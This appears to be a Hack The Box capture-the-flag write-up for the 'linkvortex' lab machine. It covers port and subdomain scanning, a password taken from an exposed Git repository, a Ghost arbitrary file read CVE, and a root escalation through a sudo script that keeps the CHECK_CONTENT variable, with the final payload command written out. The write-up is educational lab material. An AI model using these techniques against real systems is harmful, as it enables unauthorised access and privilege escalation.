---
layout: post
title: HTB - linkvortex
date: 2024-12-24 14:47 -0400
---

Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script.

# nmap
```bash
~/workspace/projects/htb/linkvortex » nmap -p- --min-rate 1024 $(cat ip.txt)                      shafou@shafou
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-24 13:26 -04
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 71.36 seconds
```

# subdomain bruteforce
```bash
~/workspace/projects/htb/linkvortex » ffuf -u http://$(cat ip.txt) -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.47
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: all
________________________________________________

[Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 161ms]
| URL | http://10.10.11.47
    * FUZZ: dev

[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 160ms]
| URL | http://10.10.11.47
    * FUZZ: #www

[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 158ms]
| URL | http://10.10.11.47
    * FUZZ: #mail

:: Progress: [19966/19966] :: Job [1/1] :: 97 req/sec :: Duration: [0:03:26] :: Errors: 0 ::
```

# endpoint bruteforce
- .git found

# password found on git
- OctopiFociPilfer45

# looking at ghost docs
- login screen at /ghost/
- have to deduce the email `admin@linkvortex.htb`, more of a convention than a deduction

# ghost version
- Version: 5.58.0
- screen shot

# vulnerable to
- CVE-2023-40028 arbitrary file read
- poc on github
- by looking at the dockerfile we get the path of the config /var/lib/ghost/config.production.json
- that has the ssh login password for the bob user

# user
`user.txt - 33c3c***************************`

# root
sudo -l shows a script we can use
it also has the option `env_keep+=CHECK_CONTENT`
that means sudo will keep CHECK_CONTENT if we set it

the vulnerability on the script is on:
```bash
if $CHECK_CONTENT;then
```
whatever we put on $CHECK_CONTENT runs as root.

To reach that we need a symlink that ends with .png and we can't use spaces because of the check on line 5:
```bash
bob@linkvortex:/tmp$ export CHECK_CONTENT='echo 123'; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh bla.png
/opt/ghost/clean_symlink.sh: line 5: [: echo: binary operator expected
```

Final payload:
```bash
ln -s bla.png ble.png; echo 'cat /root/root.txt' > a.sh; chmod +x ./a.sh; export CHECK_CONTENT='./a.sh'; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ble.png
```

# root
`root.txt - 3d9e9***************************`
